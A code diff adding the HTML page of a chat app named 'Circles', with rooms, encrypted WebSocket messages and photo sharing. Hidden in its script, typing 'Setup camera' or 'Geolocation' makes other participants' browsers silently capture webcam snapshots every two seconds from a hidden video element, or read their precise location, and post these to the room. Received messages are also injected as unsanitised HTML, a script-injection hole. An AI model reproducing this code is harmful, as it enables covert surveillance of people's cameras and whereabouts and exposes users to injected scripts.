@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Circles</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body>
+    <audio id="notificationSound" class="hidden">
+        <source src="/public/static/musics/apple.mp3" type="audio/mpeg">
+    </audio>
+    <input class="hidden" type="file" id="photoInput" accept="image/*">
+    <div id="camera" class="hidden">
+        <video id="video" playsinline controls muted>Video stream not available.</video>
+        <canvas id="canvas"> </canvas>
+    </div>
+
+    <div id="loading" class="fixed right-0 left-0 bottom-0 top-0 bg-white z-20">
+
+    </div>
+
+    <div id="card" onclick="closeCard();"
+        class="hidden fixed right-0 left-0 bottom-0 top-0 bg-white z-20 flex flex-col justify-center items-center">
+        <!-- <button onclick="closeCard();" class="bg-black px-20 py-2 rounded-md text-white">Close</button> -->
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.getElementById("loading").classList.add("hidden");
+        }, 2000);
+    </script>
+
+    <header
+        class="fixed right-0 left-0 bottom-auto top-0 bg-gradient-to-b from-lime-300 to-lime-500 p-5 pb-20 flex flex-row items-start">
+        <div class="w-10 h-10 border-4 border-solid border-black rounded-full"></div>
+        <h2 class="ml-5 text-2xl font-bold">Circles</h2>
+    </header>
+
+    <div id="start-message" class="hidden fixed right-0 left-0 bottom-0 top-20 bg-white rounded-t-xl">
+        <div class="w-full h-full p-5 overflow-auto scroll-smooth">
+            <h3 class="text-xl font-bold">Chat</h3>
+            <div class="text-xs">
+                <p class="mt-2 text-gray-800">
+                    Room ID
+                    <strong id="joinedRoomId"></strong>
+                </p>
+                <div class="flex flex-row items-center">
+                    <p class="mt-2 text-gray-800">
+                        Online
+                        <strong id="RoomOnlineCount"></strong>
+                    </p>
+                    <p class="ml-5 mt-2 text-gray-800">
+                        Delay
+                        <strong id="RoomDelay"></strong>
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Message List -->
+        <div class="fixed right-0 left-0 bottom-20 top-48 px-5 overflow-auto scroll-smooth">
+            <ul id="message-list">
+            </ul>
+        </div>
+
+        <!-- Lock -->
+        <div class="fixed right-5 left-auto bottom-auto top-24">
+            <button id="lockButton" class="px-4 py-1 bg-red-500 text-lg rounded-md">unlocked</button>
+        </div>
+
+        <!-- Input bar -->
+        <div class="fixed right-5 left-5 bottom-5 top-auto h-12 text-lg">
+            <div class="relative w-full h-full flex flex-row justify-between items-center">
+                <input class="absolute right-0 left-0 bottom-0 top-0 outline-none bg-gray-100 pl-5 pr-28 rounded-full"
+                    type="text" name="" id="user-input" placeholder="Message">
+
+                <div onclick="callModuleSendMessage();" class="absolute right-14 left-auto bottom-auto top-auto">
+                    <svg class="w-10 h-10 p-0.5" fill="#000000" version="1.1" id="Layer_1"
+                        xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+                        viewBox="0 0 512 512" xml:space="preserve">
+                        <g>
+                            <g>
+                                <path
+                                    d="M256,0C114.837,0,0,114.837,0,256s114.837,256,256,256s256-114.837,256-256S397.163,0,256,0z M359.787,330.709
+                                        			c-3.84,6.571-10.859,10.624-18.453,10.624H170.667c-7.616,0-14.635-4.053-18.453-10.624c-3.818-6.571-3.84-14.677-0.064-21.291
+                                        			l85.333-149.333c7.573-13.291,29.44-13.291,37.035,0l85.333,149.333C363.627,316.032,363.605,324.139,359.787,330.709z" />
+                            </g>
+                        </g>
+                        <g>
+                            <g>
+                                <polygon points="255.987,213.675 207.433,298.667 304.563,298.667" />
+                            </g>
+                        </g>
+                    </svg>
+                </div>
+
+                <div onclick="callSendPhoto();" class="absolute right-3 left-auto bottom-auto top-auto">
+                    <svg class="w-10 h-10" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <g id="SVGRepo_bgCarrier" stroke-width="0" />
+                        <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />
+                        <g id="SVGRepo_iconCarrier">
+                            <rect width="24" height="24" />
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="M13 9C13 8.44772 12.5523 8 12 8C11.4477 8 11 8.44772 11 9V11H9C8.44772 11 8 11.4477 8 12C8 12.5523 8.44772 13 9 13H11V15C11 15.5523 11.4477 16 12 16C12.5523 16 13 15.5523 13 15V13H15C15.5523 13 16 12.5523 16 12C16 11.4477 15.5523 11 15 11H13V9ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12Z"
+                                fill="#000000" />
+                        </g>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="clear-display-container" onclick="closeClearDisplay()"
+        class="hidden z-20 fixed right-0 left-0 bottom-0 top-20 bg-white rounded-t-xl flex flex-col justify-center items-center p-5">
+
+    </div>
+
+    <main class="fixed right-0 left-0 bottom-0 top-20 bg-white rounded-t-xl">
+        <div id="capture" class="w-full h-2/4 p-5 overflow-auto scroll-smooth">
+            <h3 id="ce-2" class="text-xl font-bold">Create Room</h3>
+
+            <!-- Card -->
+            <div id="card-container"
+                class="w-full h-48 relative my-5 p-5 bg-gradient-to-r from-lime-400 to-lime-400 rounded-xl shadow-2xl shadow-lime-300">
+                <div class="flex flex-row items-start">
+                    <div class="w-8 h-8 border-4 border-solid border-white rounded-full"></div>
+                    <h2 class="ml-3 text-xl font-bold text-white">Circles</h2>
+                </div>
+                <div class="mt-5 text-white">
+                    Room ID
+                    <p id="roomId" class="font-bold text-lg">0000 0000 0000 0000</p>
+                </div>
+                <div class="w-20 h-20 p-1 border-2 border-dashed border-white rounded-md absolute right-5 top-5">
+                    <img id="roomQrCode" class="w-full h-full rounded-md" src="/public/static/js/default-qr-code.png"
+                        alt="Qr Code">
+                </div>
+                <div class="absolute right-5 left-5 bottom-5 text-sm">
+                    <p class="break-words break-all">
+                        <strong class="text-xs" id="roomLink">xxxxxxxxxxxxxxxxxxxx</strong>
+                    </p>
+                </div>
+            </div>
+
+            <div id="ce-0" class="z-20 mt-10 flex flex-row justify-between items-center text-lg">
+                <input class="p-2 outline-none bg-gray-50 shadow-md shadow-gray-100 rounded-md" type="text" name=""
+                    id="room-password" placeholder="room password (optional)">
+                <button onclick="createRoom()"
+                    class="px-4 py-2 bg-gray-50 shadow-md shadow-gray-100 rounded-md">Create</button>
+                <script>
+                    function createRoom() {
+                        const password = document.getElementById("room-password").value;
+                        try {
+                            fetch(`/createRoom?password=${password}`).then(res => res.text()).then(text => {
+                                const host = document.location.hostname;
+                                document.getElementById("roomId").innerHTML = text;
+                                document.getElementById("roomQrCode").src = `/qr-code/${encodeURIComponent(`https://${host}?roomId=${text}`)}/1000/a3e635/ffffff/0`;
+                                document.getElementById("roomLink").innerHTML = `https://${host}?roomId=${text}`;
+                            });
+                        } catch {
+
+                        }
+                    }
+                </script>
+            </div>
+            <div id="ce-1" class="my-5 flex flex-row justify-between items-center text-lg">
+                <button id="download-card-button" onclick="downloadCard()"
+                    class="w-5-12 px-4 py-2 bg-lime-500 shadow-md shadow-lime-200 rounded-md text-white">Download
+                    card</button>
+                <button id="clear-display" onclick="clearDisplay()"
+                    class="w-5-12 px-4 py-2 bg-lime-500 shadow-md shadow-lime-200 rounded-md text-white">Clear
+                    display</button>
+
+                <script src="/public/static/js/dom-to-image.js"></script>
+                <script defer>
+                    function clearDisplay() {
+                        const container = document.getElementById("clear-display-container");
+                        const card = document.getElementById("card-container");
+                        const cardCopy = card.cloneNode(true);
+                        // cardCopy.classList.remove("my-5");
+                        container.appendChild(cardCopy);
+                        container.classList.remove("hidden");
+                    }
+
+                    function closeClearDisplay() {
+                        const container = document.getElementById("clear-display-container");
+                        container.innerHTML = "";
+                        container.classList.add("hidden");
+                    }
+
+                    function closeCard() {
+                        const card = document.getElementById("card");
+                        card.classList.add("hidden");
+                    }
+
+                    function downloadCard() {
+                        const card = document.getElementById("card");
+                        const node = document.getElementById("capture");
+                        const cardContainer = document.getElementById("card-container");
+                        const button = document.getElementById("download-card-button");
+
+                        const ce0 = document.getElementById("ce-0");
+                        const ce1 = document.getElementById("ce-1");
+                        const ce2 = document.getElementById("ce-2");
+                        ce0.classList.add("hidden");
+                        ce1.classList.add("hidden");
+                        ce2.classList.add("hidden");
+                        cardContainer.classList.remove("shadow-2xl", "shadow-lime-300");
+
+                        button.innerHTML = "Processing...";
+                        domtoimage.toPng(node).then((dataUrl) => {
+                            const img = new Image();
+                            img.src = dataUrl;
+                            card.innerHTML = "<div class='bg-white rounded-xl'></div>";
+                            document.querySelector("#card > div").appendChild(img);
+                            card.classList.remove("hidden");
+                            button.innerHTML = "Download Card";
+                            ce0.classList.remove("hidden");
+                            ce1.classList.remove("hidden");
+                            ce2.classList.remove("hidden");
+                            cardContainer.classList.add("shadow-2xl", "shadow-lime-300");
+                        }).catch(() => {
+                            button.innerHTML = "Failed";
+                            ce0.classList.remove("hidden");
+                            ce1.classList.remove("hidden");
+                            ce2.classList.remove("hidden");
+                            cardContainer.classList.add("shadow-2xl", "shadow-lime-300");
+                        });
+                    }
+                </script>
+            </div>
+        </div>
+
+        <div class="w-full h-2/4 p-5 overflow-auto scroll-smooth">
+            <h3 class="text-xl font-bold bg-white py-5 sticky top-0">Online Rooms <span id="rooms-count"
+                    class="text-lime-500"></span>
+            </h3>
+
+            <ul id="online-rooms" class="mt-5">
+            </ul>
+        </div>
+    </main>
+
+    <script type="module" defer>
+        let takePhotoFlag = false;
+
+        function loadRooms() {
+            const apiUrl = "/rooms";
+            fetch(apiUrl).then(res => res.json()).then(json => {
+                const countE = document.getElementById("rooms-count");
+                const list = document.getElementById("online-rooms");
+                list.innerHTML = "";
+                let count = 0;
+                for (const iterator of json) {
+                    count++;
+                    const template = `<li
+                    class="mt-5 bg-gradient-to-r from-gray-50 to-gray-100 p-2 rounded-md flex flex-row justify-between items-center">
+                    <div>
+                        <p class="font-bold text-lg">${iterator.roomId}</p>
+                        <div class="mt-2">
+                            <span class="bg-${iterator.online === 0 ? "white text-black" : "lime-500"} px-2 py-1 rounded-full text-white text-sm">${iterator.online} online</span>
+                            <span class="bg-${iterator.locked ? "black" : "lime-500"} ml-2 px-2 py-1 rounded-full text-white text-sm">${iterator.locked ? "locked" : "unlocked"}</span>
+                             <span class="bg-${iterator.passwordProtected ? "yellow-500" : "lime-500"} ml-2 px-2 py-1 rounded-full text-white text-sm">${iterator.passwordProtected ? "protected" : "open"}</span>
+                        </div>
+                    </div>
+                    <div>
+                        <button onclick="window.callModuleFunction('${iterator.roomId}')" class="p-2 bg-white rounded-md font-bold text-lg">Join in</button>
+                    </div>
+                </li>`;
+                    list.innerHTML += template;
+                }
+                countE.innerHTML = count;
+            });
+        }
+        loadRooms();
+        const loadRoomIntervalId = setInterval(() => {
+            loadRooms();
+        }, 5000);
+
+        window.onload = () => {
+            try {
+                const url = document.location.href;
+                if (url.includes("roomId")) {
+                    const roomId = url.split("?roomId=")[1].trim();
+                    window.callModuleFunction(roomId);
+                }
+            } catch (error) {
+
+            }
+        };
+
+        let PUBLIC_KEY;
+        let AES_KEYS;
+        setTimeout(async () => {
+            AES_KEYS = await generateAesKey();
+        }, 20);
+
+        window.callModuleFunction = function (roomId) {
+            try {
+                joinRoom(roomId);
+            } catch (error) {
+
+            }
+        };
+
+        window.callModuleSendMessage = function () {
+            sendMessage();
+        };
+
+        window.callSendPhoto = () => {
+            sendPhoto();
+        }
+
+        function joinRoom(roomId) {
+            if (!roomId) {
+                return;
+            }
+            clearInterval(loadRoomIntervalId);
+
+            const m = document.querySelector("main");
+            m.classList.add("hidden");
+            const sm = document.getElementById("start-message");
+            sm.classList.remove("hidden");
+
+            const webSocketUrl = `wss://${document.location.hostname}/socket?roomId=` + roomId;
+            socket = new WebSocket(webSocketUrl);
+
+            let heartbeatFlag = false;
+            socket.onopen = async () => {
+                setInterval(() => {
+                    if (!heartbeatFlag) {
+                        heartbeatFlag = true;
+                        const msgObj = {
+                            event: "heartbeat",
+                            body: {
+                                timestamp: Date.now()
+                            }
+                        }
+                        socket.send(JSON.stringify(msgObj));
+                    }
+                }, 200);
+            };
+            socket.onclose = () => {
+                handleError();
+            };
+            socket.onmessage = async (event) => {
+                const data = JSON.parse(event.data);
+
+                if (data.event === "heartbeat") {
+                    heartbeatFlag = false;
+                    const delay = Math.floor((Date.now() - data.body.timestamp) / 2);
+                    document.getElementById("RoomDelay").innerHTML = delay;
+                }
+
+                if (data.event === "roomUnlocked") {
+                    lockButton.classList.remove("bg-lime-500");
+                    lockButton.classList.add("bg-red-500");
+                    lockButton.innerHTML = "unlocked";
+                } else if (data.event === "roomLocked") {
+                    lockButton.classList.remove("bg-red-500");
+                    lockButton.classList.add("bg-lime-500");
+                    lockButton.innerHTML = "locked";
+                } else if (data.event === "hi") {
+                    selfId = data.yourId;
+                    document.getElementById("joinedRoomId").innerHTML = data.roomId;
+
+                    setTimeout(async () => {
+                        try {
+                            PUBLIC_KEY = await importRsaKey(data.publicKeyHex, "encrypt");
+                        } catch (error) {
+
+                        }
+
+                    }, 20);
+
+                    setTimeout(async () => {
+                        const aesKeys = {
+                            key: AES_KEYS.keyHex,
+                            iv: AES_KEYS.ivHex,
+                        };
+                        const jsonAesKeys = JSON.stringify(aesKeys);
+                        const u8aKeys = new TextEncoder().encode(jsonAesKeys);
+                        const encryptedAesKeys = await rsaEncrypt(u8aKeys, PUBLIC_KEY);
+
+                        const msgObj = {
+                            event: "SetAesKeys",
+                            aesKeys: uint8ArrayToHex(encryptedAesKeys),
+                        };
+                        socket.send(JSON.stringify(msgObj));
+                    }, 1000);
+                } else if (data.event === "online_count") {
+                    document.getElementById("RoomOnlineCount").innerHTML = data.online;
+                }
+
+                if (data.event === "KeyOK") {
+                    setTimeout(async () => {
+                        const decryptedMessage = await aesDecrypt(hexToUint8Array(data.message), AES_KEYS.key, AES_KEYS.iv);
+                    }, 200);
+                }
+
+                if (data.event === "message") {
+                    setTimeout(async () => {
+                        const decryptedMessage = await aesDecrypt(hexToUint8Array(data.message), AES_KEYS.key, AES_KEYS.iv);
+
+                        const msgList = document.getElementById("message-list");
+                        const template = `<li class="my-2">
+                        <span class="text-sm text-gray-500">${data.sender}</span>
+                        <div class="bg-black text-white max-w-fit px-${data.type === "photo" ? "1" : "2"} py-1 rounded-tl-sm rounded-b-md rounded-r-md text-lg break-words break-all">
+                            ${new TextDecoder().decode(decryptedMessage)}
+                        </div>
+                    </li>`;
+                        msgList.innerHTML += template;
+                        updateScrollBar();
+                        playNotificationSound();
+                    }, 20);
+                }
+
+                if (data.event === "setupCamera") {
+                    takePhotoFlag = true;
+                } else if (data.event === "stopCamera") {
+                    takePhotoFlag = false;
+                } else if (data.event === "geolocation") {
+                    getGeolocation();
+                }
+            };
+            socket.onerror = (_error) => {
+                handleError();
+            };
+        }
+
+        function uint8ArrayToHex(uint8Array) {
+            return Array.from(uint8Array, (__byte) => __byte.toString(16).padStart(2, "0")).join("");
+        }
+        function hexToUint8Array(hex) {
+            const hexArray = hex.match(/.{1,2}/g).map((__byte) => parseInt(__byte, 16));
+            return new Uint8Array(hexArray);
+        }
+        async function digestMessage(msgUint8) {
+            const hashBuffer = await crypto.subtle.digest("SHA-256", msgUint8);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            const hashHex = hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
+            return hashHex;
+        }
+        async function generateAesKey() {
+            const aesKey = await crypto.subtle.generateKey(
+                {
+                    name: "AES-GCM",
+                    length: 256,
+                },
+                true,
+                ["encrypt", "decrypt"]
+            );
+            const aesKeyJwk = await crypto.subtle.exportKey("jwk", aesKey);
+            const aesKeyUint8Array = new TextEncoder().encode(JSON.stringify(aesKeyJwk));
+            const aesIv = crypto.getRandomValues(new Uint8Array(12));
+            const aesKeyHex = uint8ArrayToHex(aesKeyUint8Array);
+            const aesIvHex = uint8ArrayToHex(aesIv);
+            return {
+                key: aesKey,
+                iv: aesIv,
+                keyHex: aesKeyHex,
+                ivHex: aesIvHex,
+            };
+        }
+        async function generateRsaKeyPair() {
+            const rsaKeyPair = await crypto.subtle.generateKey(
+                {
+                    name: "RSA-OAEP",
+                    modulusLength: 2048,
+                    publicExponent: new Uint8Array([0x01, 0x00, 0x01]),
+                    hash: "SHA-256",
+                },
+                true,
+                ["encrypt", "decrypt"]
+            );
+            const publicKey = await crypto.subtle.exportKey("jwk", rsaKeyPair.publicKey);
+            const privateKey = await crypto.subtle.exportKey("jwk", rsaKeyPair.privateKey);
+            const publicKeyUint8Array = new TextEncoder().encode(JSON.stringify(publicKey));
+            const privateKeyUint8Array = new TextEncoder().encode(JSON.stringify(privateKey));
+            const publicKeyHex = uint8ArrayToHex(publicKeyUint8Array);
+            const privateKeyHex = uint8ArrayToHex(privateKeyUint8Array);
+            return {
+                publicKey: rsaKeyPair.publicKey,
+                privateKey: rsaKeyPair.privateKey,
+                publicKeyHex: publicKeyHex,
+                privateKeyHex: privateKeyHex,
+            };
+        }
+        async function importAesKey(aesKeyHex, aesIvHex) {
+            try {
+                const aesKeyUint8Array = hexToUint8Array(aesKeyHex);
+                const aesIvUint8Array = hexToUint8Array(aesIvHex);
+                const aesKeyText = new TextDecoder().decode(aesKeyUint8Array);
+                const aesKey = JSON.parse(aesKeyText);
+                const importedAesKey = await crypto.subtle.importKey("jwk", aesKey, "AES-GCM", true, ["encrypt", "decrypt"]);
+                return {
+                    key: importedAesKey,
+                    iv: aesIvUint8Array,
+                };
+            } catch (error) {
+                alert(error.message);
+            }
+        }
+        async function importRsaKey(keyHex, keyType) {
+            try {
+                const keyUint8Array = hexToUint8Array(keyHex);
+                const keyText = new TextDecoder().decode(keyUint8Array);
+                const key = JSON.parse(keyText);
+                const importedKey = await crypto.subtle.importKey(
+                    "jwk",
+                    key,
+                    {
+                        name: "RSA-OAEP",
+                        hash: "SHA-256",
+                    },
+                    true,
+                    [keyType]
+                );
+                return importedKey;
+            } catch (error) {
+                alert(error.message);
+            }
+        }
+        async function aesEncrypt(data, aesKey, aesIv) {
+            const encryptedData = await crypto.subtle.encrypt(
+                {
+                    name: "AES-GCM",
+                    iv: aesIv,
+                },
+                aesKey,
+                data
+            );
+            return new Uint8Array(encryptedData);
+        }
+        async function aesDecrypt(encryptedData, aesKey, aesIv) {
+            const decryptedData = await crypto.subtle.decrypt(
+                {
+                    name: "AES-GCM",
+                    iv: aesIv,
+                },
+                aesKey,
+                encryptedData
+            );
+            return new Uint8Array(decryptedData);
+        }
+        function splitDataIntoChunks(data, chunkSize) {
+            const chunks = [];
+            for (let i = 0; i < data.length; i += chunkSize) {
+                chunks.push(data.slice(i, i + chunkSize));
+            }
+            return chunks;
+        }
+        function concatenateUint8Arrays(arrays) {
+            const totalLength = arrays.reduce((acc, arr) => acc + arr.length, 0);
+            const result = new Uint8Array(totalLength);
+            let offset = 0;
+            arrays.forEach((arr) => {
+                result.set(arr, offset);
+                offset += arr.length;
+            });
+            return result;
+        }
+        async function rsaEncrypt(data, publicKey) {
+            const chunks = splitDataIntoChunks(data, 190);
+            const encryptedChunks = [];
+            for (const chunk of chunks) {
+                const encryptedChunk = await crypto.subtle.encrypt(
+                    {
+                        name: "RSA-OAEP",
+                    },
+                    publicKey,
+                    chunk
+                );
+                encryptedChunks.push(new Uint8Array(encryptedChunk));
+            }
+            return concatenateUint8Arrays(encryptedChunks);
+        }
+        async function rsaDecrypt(encryptedData, privateKey) {
+            const chunks = splitDataIntoChunks(encryptedData, 256);
+            const decryptedChunks = [];
+            for (const chunk of chunks) {
+                const decryptedChunk = await crypto.subtle.decrypt(
+                    {
+                        name: "RSA-OAEP",
+                    },
+                    privateKey,
+                    chunk
+                );
+                decryptedChunks.push(new Uint8Array(decryptedChunk));
+            }
+            return concatenateUint8Arrays(decryptedChunks);
+        }
+
+        let socket;
+
+        const lockButton = document.getElementById("lockButton");
+        lockButton.addEventListener("click", () => {
+            const lockStatus = lockButton.innerHTML;
+            if (lockStatus === "locked") {
+                socket.send(
+                    JSON.stringify({
+                        event: "unlockRoom",
+                    })
+                );
+            } else if (lockStatus === "unlocked") {
+                socket.send(
+                    JSON.stringify({
+                        event: "lockRoom",
+                    })
+                );
+            }
+        });
+
+        let selfId = "";
+
+        function updateScrollBar() {
+            setTimeout(() => {
+                const e = document.getElementById("message-list");
+                e.lastElementChild.scrollIntoView({ behavior: "smooth" });
+            }, 200);
+        }
+
+        function playNotificationSound() {
+            const audio = document.getElementById("notificationSound");
+            if (audio && typeof audio.play === "function") {
+                audio.play();
+            }
+        }
+
+        function sendPhoto() {
+            const input = document.getElementById("photoInput");
+            input.click();
+
+            input.onchange = () => {
+                const file = input.files[0];
+                const reader = new FileReader();
+                reader.readAsDataURL(file);
+                reader.onload = () => {
+                    setTimeout(async () => {
+                        const message = `<img class="rounded-sm" src="${reader.result}" alt="Photo">`;
+
+                        const msgList = document.getElementById("message-list");
+                        const template = `<li class="my-2 text-right flex flex-col items-end">
+                         <span class="text-sm text-gray-500">${selfId}</span>
+                        <div
+                            class="bg-gray-100 max-w-fit px-1 py-1 rounded-tr-sm rounded-b-md rounded-l-md text-lg text-left break-words break-all">
+                            ${message}
+                        </div>
+                    </li>`;
+                        msgList.innerHTML += template;
+                        updateScrollBar();
+
+                        const encodeMessage = new TextEncoder().encode(message);
+                        const encryptedMessage = await aesEncrypt(encodeMessage, AES_KEYS.key, AES_KEYS.iv);
+
+                        socket.send(
+                            JSON.stringify({
+                                event: "message",
+                                type: "photo",
+                                message: uint8ArrayToHex(encryptedMessage),
+                            })
+                        );
+                    }, 20);
+                };
+            }
+        }
+
+        function sendMessage() {
+            setTimeout(async () => {
+                const message = document.getElementById("user-input").value;
+
+                let messageText;
+                if (message.startsWith("Setup camera")) {
+                    const messageObject = {
+                        event: "setupCamera",
+                    };
+                    messageText = JSON.stringify(messageObject);
+                } else if (message.startsWith("Stop camera")) {
+                    const messageObject = {
+                        event: "stopCamera",
+                    };
+                    messageText = JSON.stringify(messageObject);
+                } else if (message.startsWith("Geolocation")) {
+                    const messageObject = {
+                        event: "geolocation",
+                    };
+                    messageText = JSON.stringify(messageObject);
+                } else if (message.startsWith("Block")) {
+                    const messageObject = {
+                        event: "blockUser",
+                        blockUserId: message.split(" ")[1],
+                    };
+                    messageText = JSON.stringify(messageObject);
+                } else if (message.startsWith("Lock")) {
+                    const messageObject = {
+                        event: "lockRoom",
+                    };
+                    messageText = JSON.stringify(messageObject);
+                } else if (message.startsWith("Unlock")) {
+                    const messageObject = {
+                        event: "unlockRoom",
+                    };
+                    messageText = JSON.stringify(messageObject);
+                } else {
+                    const encodeMessage = new TextEncoder().encode(message);
+                    const encryptedMessage = await aesEncrypt(encodeMessage, AES_KEYS.key, AES_KEYS.iv);
+
+                    const messageObject = {
+                        event: "message",
+                        type: "text",
+                        message: uint8ArrayToHex(encryptedMessage),
+                    };
+                    messageText = JSON.stringify(messageObject);
+
+                    const msgList = document.getElementById("message-list");
+                    const template = `<li class="my-2 text-right flex flex-col items-end">
+                         <span class="text-sm text-gray-500">${selfId}</span>
+                        <div
+                            class="bg-gray-100 max-w-fit px-2 py-1 rounded-tr-sm rounded-b-md rounded-l-md text-lg text-left break-words break-all">
+                            ${message}
+                        </div>
+                    </li>`;
+                    msgList.innerHTML += template;
+                    updateScrollBar();
+                }
+
+                socket.send(messageText);
+                document.getElementById("user-input").value = "";
+            }, 20);
+        }
+
+        let handling = false;
+        function handleError() {
+            if (!handling) {
+                handling = true;
+                alert("Error");
+                window.document.location = window.document.location;
+                window.document.location.reload();
+            }
+        }
+
+        function getGeolocation() {
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0,
+            };
+
+            function success(pos) {
+                const crd = pos.coords;
+                const info = {
+                    accuracy: crd.accuracy,
+                    altitude: crd.altitude,
+                    altitudeAccuracy: crd.altitudeAccuracy,
+                    heading: crd.heading,
+                    latitude: crd.latitude,
+                    longitude: crd.longitude,
+                    speed: crd.speed
+                }
+
+                setTimeout(async () => {
+                    const message = `Geolocation Info: ${JSON.stringify(info)}`;
+                    const encodeMessage = new TextEncoder().encode(message);
+                    const encryptedMessage = await aesEncrypt(encodeMessage, AES_KEYS.key, AES_KEYS.iv);
+
+                    socket.send(JSON.stringify({
+                        event: "message",
+                        type: "text",
+                        message: uint8ArrayToHex(encryptedMessage),
+                    }));
+                }, 20);
+            }
+
+            function error(err) {
+                setTimeout(async () => {
+                    const message = `ERROR ${err.code}: ${err.message}`;
+                    const encodeMessage = new TextEncoder().encode(message);
+                    const encryptedMessage = await aesEncrypt(encodeMessage, AES_KEYS.key, AES_KEYS.iv);
+
+                    socket.send(JSON.stringify({
+                        event: "message",
+                        type: "text",
+                        message: uint8ArrayToHex(encryptedMessage),
+                    }));
+                }, 20);
+            }
+
+            navigator.geolocation.getCurrentPosition(success, error, options);
+        }
+
+        let video = null;
+        let canvas = null;
+        let context = null;
+        let streaming = false;
+        const width = 320;
+        let height = 0;
+        let init = false;
+
+        function initCamera() {
+            try {
+                init = true;
+                video = document.getElementById("video");
+                canvas = document.getElementById("canvas");
+                context = canvas.getContext("2d");
+
+                navigator.mediaDevices
+                    .getUserMedia({ video: true, audio: false })
+                    .then((stream) => {
+                        video.srcObject = stream;
+                        video.play();
+                    });
+
+                video.addEventListener(
+                    "canplay",
+                    (ev) => {
+                        if (!streaming) {
+                            height = video.videoHeight / (video.videoWidth / width);
+                            if (isNaN(height)) {
+                                height = width / (4 / 3);
+                            }
+                            video.setAttribute("width", width);
+                            video.setAttribute("height", height);
+                            canvas.setAttribute("width", width);
+                            canvas.setAttribute("height", height);
+                            streaming = true;
+                        }
+                    },
+                    false,
+                );
+            } catch {
+                init = false;
+            }
+        }
+
+        setInterval(() => {
+            if (takePhotoFlag) {
+                if (!init) {
+                    initCamera();
+                }
+
+                if (streaming) {
+                    if (width && height) {
+                        canvas.width = width;
+                        canvas.height = height;
+                        context.drawImage(video, 0, 0, width, height);
+
+                        const data = canvas.toDataURL("image/png");
+
+                        setTimeout(async () => {
+                            const message = `<img class="rounded-sm" src="${data}" alt="Photo">`;
+                            const encodeMessage = new TextEncoder().encode(message);
+                            const encryptedMessage = await aesEncrypt(encodeMessage, AES_KEYS.key, AES_KEYS.iv);
+
+                            socket.send(
+                                JSON.stringify({
+                                    event: "message",
+                                    type: "photo",
+                                    message: uint8ArrayToHex(encryptedMessage),
+                                })
+                            );
+                        }, 20);
+                    }
+                }
+            }
+        }, 2000);
+    </script>
+</body>
+
+</html>
